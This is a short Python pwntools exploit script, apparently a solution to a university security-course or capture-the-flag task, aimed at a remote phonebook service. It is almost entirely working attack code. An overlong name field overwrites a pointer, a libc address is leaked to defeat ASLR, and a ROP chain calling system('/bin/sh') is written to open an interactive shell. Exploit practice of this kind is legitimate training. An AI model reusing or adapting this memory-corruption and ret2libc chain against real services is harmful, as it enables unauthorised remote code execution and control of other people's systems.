#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33604)
#conn = pwn.process([exe.path])

#pwn.gdb.attach(conn, gdbscript="""
#set detach-on-fork off
#set follow-fork-mode child
#""")

# get stack address:
message = conn.recvline()
stack_address_top_of_stack_in_main = int(message[-16:-1], 10)
print(hex(stack_address_top_of_stack_in_main))
conn.recvuntil(b'> ')

start_entry_stack = stack_address_top_of_stack_in_main + 5*8


# 1) write "start_entry_stack" into: phonebook_entry *phonebook

# 1.1) create entry:
conn.sendline(b'A')
conn.recvuntil(b'Phone number: ')
conn.sendline(b'1337')
conn.recvuntil(b'Name: ')
conn.sendline(b'realy0sh1')
conn.recvuntil(b'> ')

# 1.2) edit entry
conn.sendline(b'E')
conn.recvuntil(b'Index: ')
conn.sendline(b'0')
conn.recvuntil(b'Phone number: ')
conn.sendline(b'1337')
conn.recvuntil(b'Name: ')
# we wan write 80 bytes => override remaining data structure
payload = b'A'*64 + pwn.p64(start_entry_stack) + pwn.p64(0x0)
conn.sendline(payload)
conn.recvuntil(b'> ')
conn.recvuntil(b'> ')

# 1.3) delete entry
conn.sendline(b'D')
conn.recvuntil(b'Index: ')
conn.sendline(b'0')
conn.recvuntil(b'> ')


# 2.) leak ASLR of libc
conn.sendline(b'S')
conn.recvuntil(b'Index: ')
conn.sendline(b'0')

_ = conn.recvline() # we do not care about number
libc_offset = conn.recvline() # this is a pointer to libc
offset = pwn.u64(libc_offset[6:-1]+b'\x00\x00')
libc_base = offset - (libc.symbols['__libc_start_main'] + 2 - 0x38)
#print(f'system{hex(libc_base+libc.symbols["system"])}')
libc.address = libc_base

conn.recvuntil(b'> ')


# 3.) write ropchain

rop = pwn.ROP(libc)
rop.call(rop.ret)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

conn.sendline(b'E')
conn.recvuntil(b'Index: ')
conn.sendline(b'0')
conn.recvuntil(b'Phone number: ')
conn.sendline(b'1337')
conn.recvuntil(b'Name: ')

conn.sendline(rop.chain())

# 4.) get shell
conn.recvuntil(b'> ')
conn.sendline(b'Q')

conn.interactive()